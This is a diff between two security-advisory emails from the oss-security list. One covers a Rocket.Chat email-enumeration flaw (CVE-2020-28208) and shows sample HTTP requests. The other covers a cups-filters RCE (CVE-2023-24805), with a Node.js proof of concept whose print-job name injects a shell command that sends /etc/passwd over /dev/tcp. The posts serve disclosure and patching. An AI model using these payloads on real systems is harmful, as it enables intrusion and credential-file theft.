@@ -1,9 +1,4 @@
-X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["5315" "Wednesday" "13" "January" "2021" "08:29:38" "+0000" "Stefan Pietsch" "s.pietsch@trovent.io" "<6cl4XA2FNQGvOMHYmqYlBWrjc3DSOfedPrmY6jQiYx__CIGHh7C3oAUzgNUGz75ASJQ--eLeDFSHfhyNpmp4gCfz7iiB45fnXCeRTa-yjIs=@trovent.io>" "174" "[oss-security] Re: Trovent Security Advisory 2010-01 [updated] / CVE-2020-28208: Rocket.Chat email address enumeration vulnerability" nil nil nil "1" "2021011308:29:38" "[oss-security] Re: Trovent Security Advisory 2010-01 [updated] / CVE-2020-28208: Rocket.Chat email address enumeration vulnerability" (number mark "U       s.pietsch@tr Jan 13  174/5315  " thread-indent "\"[oss-security] Re: Trovent Security Advisory 2010-01 [updated] / CVE-2020-28208: Rocket.Chat email address enumeration vulnerability\"\n") "<nOtVB6IX8HgEDMTZRoSF8T27q70YAYS_B_0y9-R3vMdfdPNlhYXTJ9VZ78Q-K0OVzg4QuofyWufiLNnN-sjThgbinm-sWfVGnPLtJ_ovWL8=@trovent.io>" ("<nOtVB6IX8HgEDMTZRoSF8T27q70YAYS_B_0y9-R3vMdfdPNlhYXTJ9VZ78Q-K0OVzg4QuofyWufiLNnN-sjThgbinm-sWfVGnPLtJ_ovWL8=@trovent.io>") nil nil nil nil nil nil nil "[oss-security] Re: Trovent Security Advisory 2010-01 [updated] / CVE-2020-28208: Rocket.Chat email address enumeration vulnerability" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	nil)
-X-Mozilla-Status: 0000
-X-Mozilla-Status2: 00000000
-Received: (qmail 1031 invoked by uid 550); 13 Jan 2021 11:36:48 -0000
+Received: (qmail 20362 invoked by uid 550); 17 May 2023 12:14:27 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -12,198 +7,137 @@ List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
-Received: (qmail 26561 invoked from network); 13 Jan 2021 08:29:57 -0000
-Date: Wed, 13 Jan 2021 08:29:38 +0000
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=trovent.io;
-	s=protonmail2; t=1610526584;
-	bh=3e6vvrarDVTHw7hJWGSxPmHGI43SDUO4iX13lpcRe2o=;
-	h=Date:To:From:Reply-To:Subject:In-Reply-To:References:From;
-	b=gyN17ge+wAd/gttEgAaeaZmdnq0Dloq2cl2VllLQykYANwi8fd8Mp1ZDwH1yaZcZj
-	 9qCnBzKTNoKRpZIu/trg7NaijzNcOuA5bK41xadJWgqqVdIjAEeCtiAoONOU7nV0xs
-	 ggH47GkJ9j19FsaOQMG69Qg58GmOD0/wVb+harTo8vKj7eUZRKS4S+vkz0ECQ0zvJM
-	 1S6yuh60nekz/WuVuRH7CIltmfkgAEBwmeUNKDt6ZlYIK2ROezOLKOuMD39CypCO6i
-	 wcQQnHoqxy6/BnXj7XHQVnp6OooLdOG2KOm1AdZbn758lAmh25tTFxPpIZ7szw4Vjv
-	 jbeapRK51ML5w==
-To: "fulldisclosure@seclists.org" <fulldisclosure@seclists.org>, "oss-security@lists.openwall.com" <oss-security@lists.openwall.com>, "submissions@packetstormsecurity.com" <submissions@packetstormsecurity.com>
-From: Stefan Pietsch <s.pietsch@trovent.io>
-Message-ID: <6cl4XA2FNQGvOMHYmqYlBWrjc3DSOfedPrmY6jQiYx__CIGHh7C3oAUzgNUGz75ASJQ--eLeDFSHfhyNpmp4gCfz7iiB45fnXCeRTa-yjIs=@trovent.io>
-In-Reply-To: <nOtVB6IX8HgEDMTZRoSF8T27q70YAYS_B_0y9-R3vMdfdPNlhYXTJ9VZ78Q-K0OVzg4QuofyWufiLNnN-sjThgbinm-sWfVGnPLtJ_ovWL8=@trovent.io>
-References: <nOtVB6IX8HgEDMTZRoSF8T27q70YAYS_B_0y9-R3vMdfdPNlhYXTJ9VZ78Q-K0OVzg4QuofyWufiLNnN-sjThgbinm-sWfVGnPLtJ_ovWL8=@trovent.io>
+Received: (qmail 6098 invoked from network); 17 May 2023 09:30:25 -0000
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=gmail.com; s=20221208; t=1684315813; x=1686907813;
+        h=content-transfer-encoding:content-language:to:subject:from
+         :user-agent:mime-version:date:message-id:from:to:cc:subject:date
+         :message-id:reply-to;
+        bh=o3LdYdLUPTaDbKohednoNdoYfbnWjvc9Wv3Y5QBFlRw=;
+        b=YKGlOB0WPwvKxXj+vuVfxV95fDw92JDe7x/ewqIFVeYyLEq4WVBF+And62POH6Wa3s
+         xsW9x5UfBERt8dMR8R197vT4WZ/tH0UCmweO2hNTYfrQ++lx3C8FFgMJ3kH/bqaUOQNz
+         riw7Fd6P40p5ZyNdJEN136a4T9CI3O9MgTQ3A3mqhaEM3Jj9Oij9V/TjlUeXWoC8M/Q2
+         fD45Uv4nicH5x0WpKEyFGI8fonoMV0kuCRuWmWRK7CzgTsOFxbHZOBtpieIUzJu/p8MH
+         GIjieS7YPyRKM8ftfwpUXpz8S/O/aytXiMCAQHX1uQYmww4xjfEIlug/cLQGWW3UwrdN
+         jjbg==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20221208; t=1684315813; x=1686907813;
+        h=content-transfer-encoding:content-language:to:subject:from
+         :user-agent:mime-version:date:message-id:x-gm-message-state:from:to
+         :cc:subject:date:message-id:reply-to;
+        bh=o3LdYdLUPTaDbKohednoNdoYfbnWjvc9Wv3Y5QBFlRw=;
+        b=Pld18mppngix+UJ3Ax2fdlHwSTlGRYvyQqo1Ex+mj4GgXXhfUen+BLP76ylmK7+HQ5
+         CNDLEARhGTW0+GKv0BjTmFdQYYSw3RD4xdqxkfibogNlCSovx6QRuHKwv9x+AYFdbSXI
+         pm2+HTTcs8TQFGDsRWgy96ELRbwAx2b+o/WUeATIebq9oijVbg0jRThV9yIHNXVMxkpM
+         IFqvOZQHDJe8sXRgWlyKPQEJA7Jd/kOC12aGXnGz5nhVpRQPzfU98Xrawo03VL6J/gDe
+         OHdnJnbZKU20loNqWg9z67NsinCCvBcJEWto6ixDL6I/9CxYh7yiPuDiZREvoL8BAOtf
+         8qZw==
+X-Gm-Message-State: AC+VfDzkQentrGrqCkT0lsJ4s2TKp4KiWdihyn99JbNWKIIhzJ/85mkw
+	JbPMNiZJb6HhdXSL5BafJh3LKJ/9udI=
+X-Google-Smtp-Source: ACHHUZ4Pj5n4IGJVboaaOcayWTZpcdkghAlrpPF3nTqZSxIxJiNe02LYW3BktyDiG38prCz7PIdvnw==
+X-Received: by 2002:a17:907:6287:b0:94f:29f0:edc0 with SMTP id nd7-20020a170907628700b0094f29f0edc0mr38907383ejc.44.1684315813208;
+        Wed, 17 May 2023 02:30:13 -0700 (PDT)
+Message-ID: <d20c573e-81ca-800d-5bf8-c2f96b31ea82@gmail.com>
+Date: Wed, 17 May 2023 11:30:11 +0200
 MIME-Version: 1.0
-Content-Type: multipart/signed; protocol="application/pgp-signature"; micalg=pgp-sha256; boundary="---------------------69a9a24a290b55b1502e2041bd82e263"; charset=utf-8
-Subject: [oss-security] Re: Trovent Security Advisory 2010-01 [updated] / CVE-2020-28208: Rocket.Chat email address enumeration vulnerability
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101
+ Thunderbird/102.11.0
+From: Till Kamppeter <till.kamppeter@gmail.com>
+To: oss-security@lists.openwall.com
+Content-Language: en-US
+Content-Type: text/plain; charset=UTF-8; format=flowed
+Content-Transfer-Encoding: 7bit
+Subject: [oss-security] CVE-2023-24805: RCE in cups-filters, beh CUPS backend
 
------------------------69a9a24a290b55b1502e2041bd82e263
-Content-Type: multipart/mixed;boundary=---------------------15b77fcdcbcc8e4990cd52f28f9d2c54
+Following bug got reported to OpenPrinting's GitHub, repo cups-filters, 
+as a private (security) issue report:
 
------------------------15b77fcdcbcc8e4990cd52f28f9d2c54
-Content-Transfer-Encoding: quoted-printable
-Content-Type: text/plain;charset=utf-8
+https://github.com/OpenPrinting/cups-filters/security/advisories/GHSA-gpxc-v2m8-fr3x
 
-# Trovent Security Advisory 2010-01 #
-#####################################
+Summary
 
+If you use "beh" to create an accessible network printer, this security 
+vulnerability can cause remote code execution.
 
-Email address enumeration in reset password
-###########################################
+Details
 
+cups-filters/backend/beh.c
 
-Overview
-########
+Line 288 in 5c9498a
+   retval = system(cmdline) >> 8;
 
-Advisory ID: TRSA-2010-01
-Advisory version: 1.2
-Advisory status: Public
-Advisory URL: https://trovent.io/security-advisory-2010-01
-Affected product: Web application Rocket.Chat
-Affected version: <=3D 3.9.1
-Vendor: Rocket.Chat Technologies Corp., https://rocket.chat
-Credits: Trovent Security GmbH, Nick Decker, Stefan Pietsch
+     // (context: argv = beh <job-id> <user> <title> <copies> <options> 
+[file])
+      snprintf(cmdline, sizeof(cmdline),
+      "%s/backend/%s '%s' '%s' '%s' '%s' '%s' %s",
+      cups_serverbin, scheme, argv[1], argv[2], argv[3],
+            ...
+      (argc == 6 ? "1" : argv[4]),
+      argv[5], filename);
+            ...
+    retval = system(cmdline) >> 8;
 
+The system function will be called here to execute the command, and the 
+user and title parameters are user-controlled and unsanitized .
 
-Detailed description
-####################
+PoC
 
-Trovent Security GmbH discovered an email address enumeration vulnerability
-in the password reset function of the chat application Rocket.Chat. This vu=
-lnerability lets
-an unauthorized user enumerate registered email addresses on the instance o=
-f Rocket.Chat.
+      start a beh service lpadmin -p myprinter -E -v 
+beh:/1/3/5/socket://printer:9100
 
-Severity: Medium
-CVSS Score: 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)
-CVE ID: CVE-2020-28208
-CWE ID: CWE-204
+      exploit: // https://github.com/williamkapke/ipp
 
+var ipp = require('ipp');
+var PDFDocument = require('pdfkit');
+var concat = require("concat-stream");
 
-Proof of concept
-################
-
-Sample HTTP request sent with a registered email address:
-
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~=
-~~~~~
-POST /api/v1/method.callAnon/sendForgotPasswordEmail HTTP/1.1
-Host: localhost:3000
-Content-Length: 122
-Accept: */*
-Content-Type: application/json
+var doc = new PDFDocument({margin:0});
+doc.text("1.pdf", 0, 0);
 
 
-{"message":"{\"msg\":\"method\",\"method\":\"sendForgotPasswordEmail\",\"pa=
-rams\":[\"positive@test.de\"],\"id\":\"3\"}"}
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~=
-~~~~~
-
-The server response to a valid email address:
-
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~=
-~~~~~
-HTTP/1.1 200 OK
-X-XSS-Protection: 1
-X-Content-Type-Options: nosniff
-X-Frame-Options: sameorigin
-X-Instance-ID: DQDfuEfNLdbZr3zYH
-Cache-Control: no-store
-Pragma: no-cache
-content-type: application/json
-Vary: Accept-Encoding
-Date: Tue, 03 Nov 2020 12:01:25 GMT
-Connection: keep-alive
-Content-Length: 78
-
-{"message":"{\"msg\":\"result\",\"id\":\"3\",\"result\":true}","success":tr=
-ue}
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~=
-~~~~~
-
-Sample HTTP request sent with a non registered email address:
-
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~=
-~~~~~
-POST /api/v1/method.callAnon/sendForgotPasswordEmail HTTP/1.1
-Host: localhost:3000
-Content-Length: 119
-Accept: */*
-Content-Type: application/json
+doc.pipe(concat(function (data) {
+var printer = ipp.Printer("http://127.0.0.1:6310/printers/myprinter");
+var msg = {
+"operation-attributes-tag": {
+"requesting-user-name": "Bumblebee",
+"job-name": "';env; bash -c \"/usr/bin/cat ${PWD}etc/${PWD}/passwd > 
+${PWD}dev${PWD}tcp${PWD}127.0.0.1${PWD}1337\";'' #.pdf",
+"document-format": "application/pdf"
+},
+"job-attributes-tag":{
+        "media-col": {
+          "media-source": "tray-2"
+        }
+}
+, data: data
+};
+printer.execute("Print-Job", msg, function(err, res){
+console.log(err);
+console.log(res);
+});
+}));
+doc.end();
 
 
-{"message":"{\"msg\":\"method\",\"method\":\"sendForgotPasswordEmail\",\"pa=
-rams\":[\"false@test.de\"],\"id\":\"3\"}"}
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~=
-~~~~~
+The report got assigned CVE-2023-24805
 
-The server response to an invalid email address:
+A fix is to use execv() instead of system() and was proposed as a pull 
+request attached to the bug report.
 
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~=
-~~~~~
-HTTP/1.1 200 OK
-X-XSS-Protection: 1
-X-Content-Type-Options: nosniff
-X-Frame-Options: sameorigin
-X-Instance-ID: DQDfuEfNLdbZr3zYH
-Cache-Control: no-store
-Pragma: no-cache
-content-type: application/json
-Vary: Accept-Encoding
-Date: Tue, 03 Nov 2020 12:03:08 GMT
-Connection: keep-alive
-Content-Length: 79
+https://github.com/OpenPrinting/cups-filters-ghsa-gpxc-v2m8-fr3x/pull/1
 
-{"message":"{\"msg\":\"result\",\"id\":\"3\",\"result\":false}","success":t=
-rue}
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~=
-~~~~~
+The pull request is merged now into
 
+https://github.com/OpenPrinting/cups-filters (branch "master")
 
-Solution / Workaround
-#####################
+as commit
 
-Ensure the application returns consistent generic server responses independ=
-ent
-of the email address entered during the password reset process.
+https://github.com/OpenPrinting/cups-filters/commit/8f274035756
 
-Fixed in Rocket.Chat version 3.9.2, verified by Trovent.
+and the fix is also ported to the "1.x" branch of cups-filters, as commit
 
+https://github.com/OpenPrinting/cups-filters/commit/93e60d3df35
 
-History
-#######
+The fix will also be included in the upcoming releases, 2.0.0 and 1.28.18.
 
-2020-10-27: Vulnerability found
-2020-11-03: Advisory created and CVE ID requested
-2020-11-06: Vendor contacted and informed about planned disclosure date
-2020-11-06: Vendor confirmed vulnerability, working on a fix
-2021-01-07: Advisory published
-2021-01-08: Vendor sent us information about fixed version
-2021-01-13: Updated affected version (thanks @LorenzNickel), verified with =
-3.9.1
-
------------------------15b77fcdcbcc8e4990cd52f28f9d2c54--
-
------------------------69a9a24a290b55b1502e2041bd82e263
-Content-Type: application/pgp-signature; name="signature.asc"
-Content-Description: OpenPGP digital signature
-Content-Disposition: attachment; filename="signature.asc"
-
------BEGIN PGP SIGNATURE-----
-Version: ProtonMail
-
-wsFzBAEBCAAGBQJf/q9eACEJEM8er/4ehY63FiEE0wArIZvu5AKY9ZSXzx6v
-/h6FjrdPwBAAl31mzhGO4GAxwHoJp9OK3ruh0Qe9P4h2TDkkIYWZKsBS1IMU
-eRct1DqGa1EFX11xK/1PVqvVi13pJG11IvJ3Hz5t7En6qEkazJCLgbDbKm9i
-I1Fu1y/6eIATPOxOksNMCTse7laY/2OMukVsLizNZ+kSOw2pg+Ur7nF5Qe9a
-Bm7KPzThlmRIma0OhSZOZpvorNIcgFD3TSSbrq0ojqPa+b434nQsJBVqEvZF
-Gij1i7aNI2C3xmAjvv6+ZqRNPrKPBpbziiSqB3TswVBclDxH8Q9yDE37/NX2
-SvfePeu6vBvYhy12RhsZ+WUze57l578Lf+bx/0B5ha+wNGIUoTjOSqoPvFjf
-vdpgNvzLxOh6EB/Qh1tSzRX03nsesb8cpG5Fr8pduRmu6M7rfL8ytud6n60K
-d+sjZxD1ecnfBXi3MwxNe1IEXAyqChUSXC5RhGPJP1F+AEm+Ap8t3+7dkRYe
-gve4Lyhqb4N0BCe1N76W1L10Yqh7QU9Cc/wXZdul+JwstuaMpjmngK+QXSpk
-++2Pc9jRpdTqFb/mNRXJI8XBnagJfUYp0MHVuwp1ZMLVLeXdYy5MrI2lh0lg
-Amh7US0RRvI0vSJ6LqEuyeblVXokm5N2e9zCzWeDV/IK0azQe0qMlH33qrnm
-+/5zHr3ZFCUioaicCm4lLkSpzxJ/bHumaAQ=
-=NSTc
------END PGP SIGNATURE-----
-
-
------------------------69a9a24a290b55b1502e2041bd82e263--
-
+    Till
